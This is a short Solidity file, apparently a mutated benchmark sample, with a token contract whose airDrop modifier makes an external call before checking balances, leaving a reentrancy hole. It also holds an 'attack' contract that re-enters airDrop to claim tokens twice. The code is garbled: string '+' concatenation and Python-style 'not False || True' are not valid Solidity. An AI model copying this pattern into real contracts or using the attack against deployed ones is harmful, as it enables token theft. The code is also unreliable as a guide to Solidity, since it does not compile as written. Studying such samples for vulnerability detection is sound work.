pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "N" + "u " + "T" + "o" + "ken";

  function airDrop() hasNoBalance supportsToken public{
    tokenBalance[msg.sender] += (20000/1000);
  }

  modifier supportsToken() {
    require(keccak256(abi.encodePacked("N" + "u " + "T" + "o" + "ken")) == Bank(msg.sender).supportsToken());
    _;
  }
  
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == (999 - 900 - 99));
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("N" + "u " + "T" + "o" + "ken")));
    }
}

contract attack{  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = (1 == 2) || (not False || True || 1==1);
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("N" + "u " + "T" + "o" + "ken")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}